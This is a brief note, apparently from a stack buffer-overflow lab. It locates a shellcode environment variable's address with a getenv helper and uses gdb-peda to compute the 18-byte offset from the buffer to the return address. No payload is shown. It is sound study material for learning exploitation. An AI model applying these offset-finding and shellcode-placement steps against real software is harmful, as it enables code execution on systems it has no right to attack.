ok...now the buffer size is extremely so we cannot put the shellcode inside the buffer, 
but use the environment variable approach

$ ./getenv MYSHELLCODE ./stack-L4
MYSHELLCODE will be at 0x7fffffffef91

gdb-peda$ p $rbp
$1 = (void *) 0x7fffffffd870
gdb-peda$ p &buffer
$2 = (char (*)[10]) 0x7fffffffd866

RA - &buffer = 18
